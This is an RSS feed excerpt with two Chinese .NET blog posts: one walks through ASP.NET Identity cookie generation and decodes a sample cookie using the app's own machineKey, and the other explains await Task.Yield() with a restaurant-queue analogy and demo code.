        }
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;发现它其实是设置了&lt;code&gt;SignInEntry&lt;/code&gt;，继续追踪：&lt;/p&gt;
&lt;pre class=&quot;csharp&quot;&gt;
&lt;code&gt;public Tuple&amp;lt;IPrincipal, IDictionary&amp;lt;string, string&amp;gt;&amp;gt; SignInEntry
{
    get { return _context.Get&amp;lt;Tuple&amp;lt;IPrincipal, IDictionary&amp;lt;string, string&amp;gt;&amp;gt;&amp;gt;(OwinConstants.Security.SignIn); }
    set { _context.Set(OwinConstants.Security.SignIn, value); }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;其中，&lt;code&gt;_context&lt;/code&gt;的类型为&lt;code&gt;IOwinContext&lt;/code&gt;，&lt;code&gt;OwinConstants.Security.SignIn&lt;/code&gt;的常量值为&lt;code&gt;&quot;security.SignIn&quot;&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;跟踪完毕……&lt;/p&gt;

&lt;p&gt;当然没有！但接下来就需要一定的技巧了。&lt;/p&gt;
&lt;p&gt;原来，&lt;code&gt;ASP.NET&lt;/code&gt;是一种中间件（&lt;code&gt;Middleware&lt;/code&gt;）模型，在这个例子中，它会先处理&lt;code&gt;MVC&lt;/code&gt;中间件，该中间件处理流程到设置&lt;code&gt;AuthenticationResponseGrant&lt;/code&gt;/&lt;code&gt;SignInEntry&lt;/code&gt;为止。但接下来会继续执行&lt;code&gt;CookieAuthentication&lt;/code&gt;中间件，该中间件的核心代码在&lt;code&gt;aspnet/AspNetKatana&lt;/code&gt;仓库中可以看到，关键类是&lt;code&gt;CookieAuthenticationHandler&lt;/code&gt;，核心代码如下：&lt;/p&gt;
&lt;pre class=&quot;csharp&quot;&gt;
&lt;code&gt;protected override async Task ApplyResponseGrantAsync()
{
    AuthenticationResponseGrant signin = Helper.LookupSignIn(Options.AuthenticationType);
    // ... 省略部分代码

    if (shouldSignin)
    {
        var signInContext = new CookieResponseSignInContext(
            Context,
            Options,
            Options.AuthenticationType,
            signin.Identity,
            signin.Properties,
            cookieOptions);

        // ... 省略部分代码

        model = new AuthenticationTicket(signInContext.Identity, signInContext.Properties);
        // ... 省略部分代码

        string cookieValue = Options.TicketDataFormat.Protect(model);

        Options.CookieManager.AppendResponseCookie(
            Context,
            Options.CookieName,
            cookieValue,
            signInContext.CookieOptions);
    }
    // ... 又省略部分代码
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这个原始函数有超过&lt;code&gt;200&lt;/code&gt;行代码，这里我省略了较多，但保留了关键、核心部分，想查阅原始代码可以移步&lt;code&gt;Github&lt;/code&gt;链接：&lt;a href=&quot;https://github.com/aspnet/AspNetKatana/blob/0fc4611e8b04b73f4e6bd68263e3f90e1adfa447/src/Microsoft.Owin.Security.Cookies/CookieAuthenticationHandler.cs#L130-L313&quot; class=&quot;uri&quot;&gt;https://github.com/aspnet/AspNetKatana/blob/0fc4611e8b04b73f4e6bd68263e3f90e1adfa447/src/Microsoft.Owin.Security.Cookies/CookieAuthenticationHandler.cs#L130-L313&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;这里挑几点最重要的讲。&lt;/p&gt;
&lt;h2 id=&quot;与mvc建立关系&quot;&gt;与&lt;code&gt;MVC&lt;/code&gt;建立关系&lt;/h2&gt;
&lt;p&gt;建立关系的核心代码就是第一行，它从上文中提到的位置取回了&lt;code&gt;AuthenticationResponseGrant&lt;/code&gt;，该&lt;code&gt;Grant&lt;/code&gt;保存了&lt;code&gt;Claims&lt;/code&gt;、&lt;code&gt;AuthenticationTicket&lt;/code&gt;等&lt;code&gt;Cookie&lt;/code&gt;重要组成部分：&lt;/p&gt;
&lt;pre class=&quot;csharp&quot;&gt;
&lt;code&gt;AuthenticationResponseGrant signin = Helper.LookupSignIn(Options.AuthenticationType);&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;继续查阅&lt;code&gt;LookupSignIn&lt;/code&gt;源代码，可看到，它就是从上文中的&lt;code&gt;AuthenticationManager&lt;/code&gt;中取回了&lt;code&gt;AuthenticationResponseGrant&lt;/code&gt;（有删减）：&lt;/p&gt;
&lt;pre class=&quot;csharp&quot;&gt;
&lt;code&gt;public AuthenticationResponseGrant LookupSignIn(string authenticationType)
{
    // ...
    AuthenticationResponseGrant grant = _context.Authentication.AuthenticationResponseGrant;
    // ...

    foreach (var claimsIdentity in grant.Principal.Identities)
    {
        if (string.Equals(authenticationType, claimsIdentity.AuthenticationType, StringComparison.Ordinal))
        {
            return new AuthenticationResponseGrant(claimsIdentity, grant.Properties ?? new AuthenticationProperties());
        }
    }

    return null;
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;如此一来，柳暗花明又一村，所有的线索就立即又明朗了&lt;/strong&gt;。&lt;/p&gt;
&lt;h2 id=&quot;cookie的生成&quot;&gt;Cookie的生成&lt;/h2&gt;
&lt;p&gt;从&lt;code&gt;AuthenticationTicket&lt;/code&gt;变成&lt;code&gt;Cookie&lt;/code&gt;字节串，最关键的一步在这里：&lt;/p&gt;
&lt;pre class=&quot;csharp&quot;&gt;
&lt;code&gt;string cookieValue = Options.TicketDataFormat.Protect(model);&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;在接下来的代码中，只提到使用&lt;code&gt;CookieManager&lt;/code&gt;将该&lt;code&gt;Cookie&lt;/code&gt;字节串添加到&lt;code&gt;Http&lt;/code&gt;响应中，翻阅&lt;code&gt;CookieManager&lt;/code&gt;可以看到如下代码：&lt;/p&gt;
&lt;pre class=&quot;csharp&quot;&gt;
&lt;code&gt;public void AppendResponseCookie(IOwinContext context, string key, string value, CookieOptions options)
{
    if (context == null)
    {
        throw new ArgumentNullException(&quot;context&quot;);
    }
    if (options == null)
    {
        throw new ArgumentNullException(&quot;options&quot;);
    }

    IHeaderDictionary responseHeaders = context.Response.Headers;
    // 省去“1万”行计算chunk和处理细节的流程
    responseHeaders.AppendValues(Constants.Headers.SetCookie, chunks);
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;有兴趣的朋友可以访问&lt;code&gt;Github&lt;/code&gt;看原始版本的代码：&lt;a href=&quot;https://github.com/aspnet/AspNetKatana/blob/0fc4611e8b04b73f4e6bd68263e3f90e1adfa447/src/Microsoft.Owin/Infrastructure/ChunkingCookieManager.cs#L125-L215&quot; class=&quot;uri&quot;&gt;https://github.com/aspnet/AspNetKatana/blob/0fc4611e8b04b73f4e6bd68263e3f90e1adfa447/src/Microsoft.Owin/Infrastructure/ChunkingCookieManager.cs#L125-L215&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;可见这个实现比较……简单，就是往&lt;code&gt;Response.Headers&lt;/code&gt;中加了个头，重点只要看&lt;code&gt;TicketDataFormat.Protect&lt;/code&gt;方法即可。&lt;/p&gt;
&lt;h2 id=&quot;逐渐明朗&quot;&gt;逐渐明朗&lt;/h2&gt;
&lt;p&gt;该方法源代码如下：&lt;/p&gt;
&lt;pre class=&quot;csharp&quot;&gt;
&lt;code&gt;public string Protect(TData data)
{
    byte[] userData = _serializer.Serialize(data);
    byte[] protectedData = _protector.Protect(userData);
    string protectedText = _encoder.Encode(protectedData);
    return protectedText;
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;可见它依赖于&lt;code&gt;_serializer&lt;/code&gt;、&lt;code&gt;_protector&lt;/code&gt;、&lt;code&gt;_encoder&lt;/code&gt;三个类，其中，&lt;code&gt;_serializer&lt;/code&gt;的关键代码如下：&lt;/p&gt;
&lt;pre class=&quot;csharp&quot;&gt;
&lt;code&gt;public virtual byte[] Serialize(AuthenticationTicket model)
{
    using (var memory = new MemoryStream())
    {
        using (var compression = new GZipStream(memory, CompressionLevel.Optimal))
        {
            using (var writer = new BinaryWriter(compression))
            {
                Write(writer, model);
            }
        }
        return memory.ToArray();
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;其本质是进行了一次二进制序列化，并紧接着进行了&lt;code&gt;gzip&lt;/code&gt;压缩，确保&lt;code&gt;Cookie&lt;/code&gt;大小不要失去控制（因为&lt;code&gt;.NET&lt;/code&gt;的二进制序列化结果较大，并且微软喜欢搞&lt;code&gt;xml&lt;/code&gt;，更大😂）。&lt;/p&gt;
&lt;p&gt;然后来看一下&lt;code&gt;_encoder&lt;/code&gt;源代码：&lt;/p&gt;
&lt;pre class=&quot;csharp&quot;&gt;
&lt;code&gt;public string Encode(byte[] data)
{
    if (data == null)
    {
        throw new ArgumentNullException(&quot;data&quot;);
    }

    return Convert.ToBase64String(data).TrimEnd('=').Replace('+', '-').Replace('/', '_');
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;可见就是进行了一次简单的&lt;code&gt;base64-url&lt;/code&gt;编码，注意该编码把&lt;code&gt;=&lt;/code&gt;号删掉了，所以在&lt;code&gt;base64-url&lt;/code&gt;解码时，需要补&lt;code&gt;=&lt;/code&gt;号。&lt;/p&gt;
&lt;p&gt;这两个都比较简单，稍复杂的是&lt;code&gt;_protector&lt;/code&gt;，它的类型是&lt;code&gt;IDataProtector&lt;/code&gt;。&lt;/p&gt;
&lt;h2 id=&quot;idataprotector&quot;&gt;IDataProtector&lt;/h2&gt;
&lt;p&gt;它在&lt;code&gt;CookieAuthenticationMiddleware&lt;/code&gt;中进行了初始化，创建代码和参数如下：&lt;/p&gt;
&lt;pre class=&quot;csharp&quot;&gt;
&lt;code&gt;IDataProtector dataProtector = app.CreateDataProtector(
    typeof(CookieAuthenticationMiddleware).FullName,
    Options.AuthenticationType, &quot;v1&quot;);&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;注意它传了三个参数，第一个参数是&lt;code&gt;CookieAuthenticationMiddleware&lt;/code&gt;的&lt;code&gt;FullName&lt;/code&gt;，也就是&lt;code&gt;&quot;Microsoft.Owin.Security.Cookies.CookieAuthenticationMiddleware&quot;&lt;/code&gt;，第二个参数如果没定义，默认值是&lt;code&gt;CookieAuthenticationDefaults.AuthenticationType&lt;/code&gt;，该值为定义为&lt;code&gt;&quot;Cookies&quot;&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;但是，在默认创建的&lt;code&gt;ASP.NET MVC&lt;/code&gt;模板项目中，该值被重新定义为&lt;code&gt;ASP.NET Identity&lt;/code&gt;的默认值，即&lt;code&gt;&quot;ApplicationCookie&quot;&lt;/code&gt;，需要注意。&lt;/p&gt;
&lt;p&gt;然后来看看&lt;code&gt;CreateDataProtector&lt;/code&gt;的源码：&lt;/p&gt;
&lt;pre class=&quot;csharp&quot;&gt;
&lt;code&gt;public static IDataProtector CreateDataProtector(this IAppBuilder app, params string[] purposes)
{
    if (app == null)
    {
        throw new ArgumentNullException(&quot;app&quot;);
    }

    IDataProtectionProvider dataProtectionProvider = GetDataProtectionProvider(app);
    if (dataProtectionProvider == null)
    {
        dataProtectionProvider = FallbackDataProtectionProvider(app);
    }
    return dataProtectionProvider.Create(purposes);
}

public static IDataProtectionProvider GetDataProtectionProvider(this IAppBuilder app)
{
    if (app == null)
    {
        throw new ArgumentNullException(&quot;app&quot;);
    }
    object value;
    if (app.Properties.TryGetValue(&quot;security.DataProtectionProvider&quot;, out value))
    {
        var del = value as DataProtectionProviderDelegate;
        if (del != null)
        {
            return new CallDataProtectionProvider(del);
        }
    }
    return null;
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;可见它先从&lt;code&gt;IAppBuilder&lt;/code&gt;的&lt;code&gt;&quot;security.DataProtectionProvider&quot;&lt;/code&gt;属性中取一个&lt;code&gt;IDataProtectionProvider&lt;/code&gt;，否则使用&lt;code&gt;DpapiDataProtectionProvider&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;我们翻阅代码，在&lt;code&gt;OwinAppContext&lt;/code&gt;中可以看到，该值被指定为&lt;code&gt;MachineKeyDataProtectionProvider&lt;/code&gt;：&lt;/p&gt;
&lt;pre class=&quot;csharp&quot;&gt;
&lt;code&gt;builder.Properties[Constants.SecurityDataProtectionProvider] = new MachineKeyDataProtectionProvider().ToOwinFunction();&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;文中的&lt;code&gt;Constants.SecurityDataProtectionProvider&lt;/code&gt;，刚好就被定义为&lt;code&gt;&quot;security.DataProtectionProvider&quot;&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;我们翻阅&lt;code&gt;MachineKeyDataProtector&lt;/code&gt;的源代码，刚好看到它依赖于&lt;code&gt;MachineKey&lt;/code&gt;：&lt;/p&gt;
&lt;pre class=&quot;csharp&quot;&gt;
&lt;code&gt;internal class MachineKeyDataProtector
{
    private readonly string[] _purposes;

    public MachineKeyDataProtector(params string[] purposes)
    {
        _purposes = purposes;
    }

    public virtual byte[] Protect(byte[] userData)
    {
        return MachineKey.Protect(userData, _purposes);
    }

    public virtual byte[] Unprotect(byte[] protectedData)
    {
        return MachineKey.Unprotect(protectedData, _purposes);
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;最终到了我们的老朋友&lt;code&gt;MachineKey&lt;/code&gt;。&lt;/p&gt;

&lt;p&gt;首先总结一下这个过程，对一个请求在&lt;code&gt;Mvc&lt;/code&gt;中的流程来说，这些代码集中在&lt;code&gt;ASP.NET Identity&lt;/code&gt;中，它会经过：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;&lt;code&gt;AccountController&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SignInManager&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;AuthenticationManager&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;设置&lt;code&gt;AuthenticationResponseGrant&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;然后进入&lt;code&gt;CookieAuthentication&lt;/code&gt;的流程，这些代码集中在&lt;code&gt;Owin&lt;/code&gt;中，它会经过：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;&lt;code&gt;CookieAuthenticationMiddleware&lt;/code&gt;（读取&lt;code&gt;AuthenticationResponseGrant&lt;/code&gt;）&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ISecureDataFormat&lt;/code&gt;（实现类：&lt;code&gt;SecureDataFormat&amp;lt;T&amp;gt;&lt;/code&gt;）&lt;/li&gt;
&lt;li&gt;&lt;code&gt;IDataSerializer&lt;/code&gt;（实现类：&lt;code&gt;TicketSerializer&lt;/code&gt;）&lt;/li&gt;
&lt;li&gt;&lt;code&gt;IDataProtector&lt;/code&gt;（实现类：&lt;code&gt;MachineKeyDataProtector&lt;/code&gt;）&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ITextEncoder&lt;/code&gt;（实现类：&lt;code&gt;Base64UrlTextEncoder&lt;/code&gt;）&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;这些过程，结果上文中找到的所有参数的值，我总结出的“祖传破解代码”如下：&lt;/p&gt;
&lt;pre class=&quot;csharp&quot;&gt;
&lt;code&gt;string cookie = &quot;nZBqV1M-Az7yJezhb6dUzS_urj1urB0GDufSvDJSa0pv27CnDsLHRzMDdpU039j6ApL-VNfrJULfE85yU9RFzGV_aAGXHVkGckYqkCRJUKWV8SqPEjNJ5ciVzW--uxsCBNlG9jOhJI1FJIByRzYJvidjTYABWFQnSSd7XpQRjY4lb082nDZ5lwJVK3gaC_zt6H5Z1k0lUFZRb6afF52laMc___7BdZ0mZSA2kRxTk1QY8h2gQh07HqlR_p0uwTFNKi0vW9NxkplbB8zfKbfzDj7usep3zAeDEnwofyJERtboXgV9gIS21fLjc58O-4rR362IcCi2pYjaKHwZoO4LKWe1bS4r1tyzW0Ms-39Njtiyp7lRTN4HUHMUi9PxacRNgVzkfK3msTA6LkCJA3VwRm_UUeC448Lx5pkcCPCB3lGat_5ttGRjKD_lllI-YE4esXHB5eJilJDIZlEcHLv9jYhTl17H0Jl_H3FqXyPQJR-ylQfh&quot;;
var bytes = TextEncodings.Base64Url.Decode(cookie);
var decrypted = MachineKey.Unprotect(bytes,
    &quot;Microsoft.Owin.Security.Cookies.CookieAuthenticationMiddleware&quot;,
    &quot;ApplicationCookie&quot;,
    &quot;v1&quot;);
var serializer = new TicketSerializer();
var ticket = serializer.Deserialize(decrypted);
ticket.Dump(); // Dump为LINQPad专有函数，用于方便调试显示，此处可以用循环输出代替&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;运行前请设置好&lt;code&gt;app.config&lt;/code&gt;/&lt;code&gt;web.config&lt;/code&gt;中的&lt;code&gt;machineKey&lt;/code&gt;节点，并安装&lt;code&gt;NuGet&lt;/code&gt;包：&lt;code&gt;Microsoft.Owin.Security&lt;/code&gt;，运行结果如下（完美破解）：&lt;br/&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/233608/202001/233608-20200124161659659-2005444133.png&quot;/&gt;&lt;/p&gt;

&lt;p&gt;学习方式有很多种，其中看代码是我个人非常喜欢的一种方式，并非所有代码都会一马平川。像这个例子可能还需要有一定&lt;code&gt;ASP.NET&lt;/code&gt;知识背景。&lt;/p&gt;
&lt;p&gt;注意这个“祖传代码”是基于&lt;code&gt;.NET Framework&lt;/code&gt;，由于其用到了&lt;code&gt;MachineKey&lt;/code&gt;，因此无法在&lt;code&gt;.NET Core&lt;/code&gt;中运行。我稍后将继续深入聊聊&lt;code&gt;MachineKey&lt;/code&gt;这个类，看它底层代码是如何工作的，然后最终得以在&lt;code&gt;.NET Core&lt;/code&gt;中直接破解&lt;code&gt;ASP.NET Identity&lt;/code&gt;中的&lt;code&gt;Cookie&lt;/code&gt;，敬请期待！&lt;/p&gt;
&lt;p&gt;喜欢的朋友请关注我的微信公众号：【DotNet骚操作】&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/233608/201908/233608-20190825165420518-990227633.jpg&quot; alt=&quot;DotNet骚操作&quot;/&gt;&lt;/p&gt;
&lt;p&gt;最后，在新的一年里，祝大家阖家欢乐，鼠年大吉！&lt;/p&gt;
</description>
<pubDate>Fri, 24 Jan 2020 08:20:00 +0000</pubDate>
<dc:creator>.NET骚操作</dc:creator>
<og:description>可能有人知道Cookie的生成由machineKey有关，machineKey用于决定Cookie生成的算法和密钥，并如果使用多台服务器做负载均衡时，必须指定一致的machineKey用于解密，那么这</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/sdflysha/p/20200123-how-does-aspnet-identity-cookie-generated.html</dc:identifier>
</item>
<item>
<title>【5min+】帮我排个队，谢谢。await Task.Yield() - 句幽</title>
<link>http://www.cnblogs.com/uoyo/p/12232261.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/uoyo/p/12232261.html</guid>
<description>&lt;p&gt;&lt;img src=&quot;https://images.cnblogs.com/cnblogs_com/uoyo/1627547/o_200124073003u=1385968286,1669722384&amp;amp;fm=11&amp;amp;gp=0.jpg&quot; alt=&quot;x&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;系列介绍&quot;&gt;&lt;strong&gt;系列介绍&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;【五分钟的dotnet】是一个利用您的碎片化时间来学习和丰富.net知识的博文系列。它所包含了.net体系中可能会涉及到的方方面面，比如C#的小细节，AspnetCore，微服务中的.net知识等等。&lt;br/&gt;5min+不是超过5分钟的意思，&quot;+&quot;是知识的增加。so，它是让您花费5分钟以下的时间来提升您的知识储备量。&lt;/p&gt;
&lt;h2 id=&quot;正文&quot;&gt;&lt;strong&gt;正文&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;如果您现在正在使用.NetCore的话，相信您对&lt;strong&gt;await&lt;/strong&gt; 和 &lt;strong&gt;async&lt;/strong&gt;这两个关键字再熟悉不过了。它们是为异步编程提供的语法糖，便于我们在代码中更便捷的进行异步操作。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;await&lt;/strong&gt; 和 &lt;strong&gt;async&lt;/strong&gt;其实是对Task对象都一层包装操作。而当我们查看Task对象的时候，会发现他有一个叫做 &lt;strong&gt;Yield()&lt;/strong&gt; 的方法。它的签名是这样：&lt;/p&gt;
&lt;pre class=&quot;c#&quot;&gt;
&lt;code&gt;public static YieldAwaitable Yield();&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;对于Yield这个单词，可能一下就会让我们联想到C# 里面的关键字 yield return 和yield break。那么这个Task.Yield()究竟是什么作用呢？它会和我们C#里面都关键字一样吗？&lt;/p&gt;
&lt;p&gt;而且您会在某些框架或者代码中看到：一旦使用它的话前面都会加上await关键字。这样就写成了 &lt;strong&gt;await Task.Yield()&lt;/strong&gt; 。那么这种写法到底有什么意义呢？我们又该怎么在实际项目中应用呢？&lt;/p&gt;
&lt;p&gt;好吧，接下来我们就来对它进行解密。 &lt;strong&gt;不过！不过！不过！&lt;/strong&gt; 在说这些代码之前，我们先来模拟吃个火锅。&lt;/p&gt;
&lt;p&gt;是的，您没有听错，现在我们不讲代码，来讲吃饭。（*没想到居然是这样的博主，我**都脱了，你给我说来吃火锅？*）。&lt;/p&gt;
&lt;h2 id=&quot;一顿火锅聚餐的思考&quot;&gt;&lt;strong&gt;一顿火锅聚餐的思考&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;说到吃火锅的话，我就拿我们成都比较火爆的蜀大侠来举例吧。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://timgsa.baidu.com/timg?image&amp;amp;quality=80&amp;amp;size=b9999_10000&amp;amp;sec=1579857606746&amp;amp;di=dd81b78ad15a74ebf1d1e1d5d577d711&amp;amp;imgtype=0&amp;amp;src=http%3A%2F%2F5b0988e595225.cdn.sohucs.com%2Fimages%2F20180421%2F25943154a2c74aa0b8b5538b6c9faa03.jpeg&quot; alt=&quot;x&quot;/&gt;&lt;/p&gt;
&lt;p&gt;说实话，每天去蜀大侠排队的人说真的多。（&lt;em&gt;这不是打广告哈。对了，麻烦蜀大侠打个钱哈&lt;/em&gt;）。&lt;/p&gt;
&lt;p&gt;曾经的大学室友毕业之后很多年没有见过了，这次大家说挑个时间找机会聚一下。很早之前就定了在今天去春熙路吃个火锅。但是今天毕竟是周五嘛，大家都还要上班，所以准备下班后集合。室友加上我一共六个人，准备凑一个大桌饱餐一顿。&lt;/p&gt;
&lt;p&gt;六点下班之后，我就很快的来到了蜀大侠火锅店的门口，毕竟我上班的地方离春熙路很近。这个时候里面还是有位置的。于是我掏出手机在群里问了一下大家，还有多久能够到。&lt;/p&gt;
&lt;p&gt;此时坑B的剧情来了，小李说他要等一会走，可能要打扫下办公室，毕竟明天周末嘛。小王就惨了，他说他要晚一个半小时，因为他刚才发现了一个bug。&lt;/p&gt;
&lt;p&gt;等了一会，来蜀大侠吃饭的人就开始多了起来。此时的我该怎么办呢？&lt;/p&gt;
&lt;p&gt;“我是在进店里坐着占一个大桌等一个半小时等到小王来吗？”&lt;/p&gt;
&lt;p&gt;如果您是蜀大侠店的老板你会允许我这么做吗？ 我估计你会把我打死，因为这个时候正是黄金时期，我在那儿占着坑位不拉*，白白浪费你挣钱的机会。&lt;/p&gt;
&lt;p&gt;好吧，我作为一个好公民，我还是找前台排了一个号。（我们这儿过号了延3桌还算很人性）。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images.cnblogs.com/cnblogs_com/uoyo/1627547/o_200124064756timg%20(1).png&quot; alt=&quot;x&quot;/&gt;&lt;/p&gt;
&lt;p&gt;最后，等了一个半小时之后，小王来了。这时火锅店已经爆满了，排了很多人。我们靠排的号最后延三桌吃到了火锅。&lt;/p&gt;
&lt;h2 id=&quot;传说中的await-task.yield&quot;&gt;&lt;strong&gt;传说中的await Task.Yield()&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;好了，火锅的故事讲完了。现在我们来吹回我们文章的主体：Task.Yield()。&lt;/p&gt;
&lt;p&gt;国际惯例，先来看看Msdn给出的解释：&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;创建异步产生当前上下文的等待任务。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这NM，什么鬼。好吧，它也知道我们看不懂，然后下面给了注解：&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;可以在异步方法中使用 await Task.Yield(); 来强制异步完成方法。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;原来await Task.Yield()这种写法就是从这儿出来都呀，就相当于该方法是专门配合await使用的吗？&lt;/p&gt;
&lt;p&gt;现在来回忆一下我们刚才所讲的火锅的故事。（&lt;em&gt;故事真的不是白讲的哈，虽然蜀大侠真香。蜀大侠，请再次打钱&lt;/em&gt;）&lt;/p&gt;
&lt;p&gt;如果把我们的系统资源看做是火锅店里面的位置，此时我们构建了一个非常消耗时间的任务需要做，这个任务您就可以看做是我们寝室的聚餐，因为小王加班，所以导致我们需要消耗太多时间。而火锅店门口那些等待的人就是系统中其他的任务。&lt;/p&gt;
&lt;p&gt;我们怎么去保证任务分配最优呢？ 是我先来蜀大侠门口所以就让我先进店一直座在位置上吗？ 显然这不是最优，因为我不急着使用资源，我座在那儿也不会点菜，还要等小王嘛。 所以您会优先把位置让给后面真正要吃饭的人去座。&lt;/p&gt;
&lt;p&gt;我们的处理器也是有处理能力的极限的（具体看核心数和线程数），就好比火锅店的桌位也是有极限的，反正场子只能摆下那么多桌子。所以，我们有没有办法像上面排号一样，虽然轮到我了，我只排号，让真正需要使用资源的人去使用。&lt;/p&gt;
&lt;p&gt;来吧，用我们的代码来演示这个场景：&lt;/p&gt;
&lt;pre class=&quot;c#&quot;&gt;
&lt;code&gt;public class AwaitYieldDemo
{
    public void MockHotPotRestaurant()
    {
        Task[] tasks = new Task[20];
        //构建一批吃火锅的人
        for (int i = 0; i &amp;lt; tasks.Length; i++)
        {
            tasks[i] = new Task(PersonEatHot, i);
        }
        //人们陆续来吃火锅
        for (int j = 0; j &amp;lt; tasks.Length / 2; j++)
        {
            tasks[j].Start();
        }
        //我来吃火锅了
        GotoShuDaXiaEatHotPot();
        //人们陆续来吃火锅
        for (int j = 10; j &amp;lt; tasks.Length; j++)
        {
            tasks[j].Start();
        }
    }
    private void PersonEatHot(object personNo)
    {
        Console.WriteLine($&quot;I am No.{personNo} person.I enter restaurant&quot;);
        Thread.Sleep(1000);   //eating
        Console.WriteLine($&quot;I am No.{ personNo } person.I eat completed.&quot;);
    }
    private async Task GotoShuDaXiaEatHotPot()
    {
        Console.WriteLine($&quot;I get a waiting card.&quot;);
        await Task.Yield();  //到店了 先排个号
        WaitMyPartnerJoin(5);  //等待我的5个小伙伴集合
        await EatingHotPot();   //开始吃火锅
    }
    private async Task EatingHotPot()
    {
        await Task.Run(() =&amp;gt;
        {
            Console.WriteLine(&quot;eating hot pot with my friends&quot;);
            Thread.Sleep(1000);
            Console.WriteLine(&quot;Completed : eating hot pot with my friends&quot;);
        });
    }
    private void WaitMyPartnerJoin(int partnerNum)
    {
        Console.WriteLine(&quot;Waiting my partner join.&quot;);
        for (int i = 0; i &amp;lt; partnerNum; i++)
        {
            for (int j = 0; j &amp;lt; 1000000; j++)
            {
            }
            Console.WriteLine($&quot;no.{i} friend join.&quot;);
        }
        Console.WriteLine(&quot;everyone is here.&quot;);
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;如果您有兴趣可以直接拷贝代码来执行。分别测试开启和关闭&lt;strong&gt;GotoShuDaXiaEatHotPot&lt;/strong&gt; 中的 &lt;strong&gt;await Task.Yield();&lt;/strong&gt; 语句，然后看看有什么区别。&lt;/p&gt;
&lt;p&gt;您会看到如果不使用 &lt;strong&gt;await Task.Yield();&lt;/strong&gt; 的话，我们的代码被线程执行到的时候，就会直接执行接下来的任务。 如果开启的话，它会去执行其他任务。&lt;/p&gt;
&lt;p&gt;那么，它和我们传统的关键字yield return有什么联系吗？ 对于传统的yield return关键字，它会返回一个&lt;strong&gt;IEnumerable&lt;/strong&gt;对象，该对象可以被我们使用foreach语法糖来进行迭代。(&lt;em&gt;关于IEnumerable您可以参考&lt;a href=&quot;https://www.cnblogs.com/uoyo/p/12177511.html&quot;&gt;你怎么穿着品如的衣服？IEnumerable AND IEnumerator&lt;/a&gt;&lt;/em&gt;)。&lt;/p&gt;
&lt;p&gt;而对于使用了yield return的foreach，它每次迭代都会返回主循环体，进行下次取数时再进入迭代器内运算，从而进行&lt;strong&gt;按需所取&lt;/strong&gt;的操作。&lt;/p&gt;
&lt;p&gt;而我们的await Task.Yield()和yield return相似都地方就是，当遇到该内容都时候，就会返回到原有的执行体内。&lt;/p&gt;
&lt;p&gt;所以现在来看MSDN对Yield方法的解释：“创建异步产生当前上下文的等待任务。可以在异步方法中使用 await Task.Yield(); 来强制异步完成方法” 。任务被产生了之后，很快就返回到原有的上下文中，而此时原来的上下文就有机会执行其他的任务了。&lt;/p&gt;
&lt;h2 id=&quot;什么场景使用&quot;&gt;&lt;strong&gt;什么场景使用&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;所以我们知道了它的益处之后，我们会在什么情况下使用呢：如果我们当前任务执行一个很耗时的操作，而且它的优先级对我们来说又不是很高的时候，我们则可以考虑在方法开始的时候加上&lt;strong&gt;await Task.Yield()&lt;/strong&gt;。让系统去调度其他更需要做的任务，稍后再来完成方法体内的耗时操作。&lt;/p&gt;
&lt;p&gt;那么如果我只使用&lt;strong&gt;Task.Yield()&lt;/strong&gt;，而不使用await关键字呢？ 哈哈，这是个秘密，嘘。（&lt;em&gt;您可以在上面的demo代码中尝试&lt;/em&gt;）。&lt;/p&gt;
&lt;p&gt;&lt;em&gt;最后，小声说一句：创作不易，点个推荐吧&lt;/em&gt;😇&lt;/p&gt;
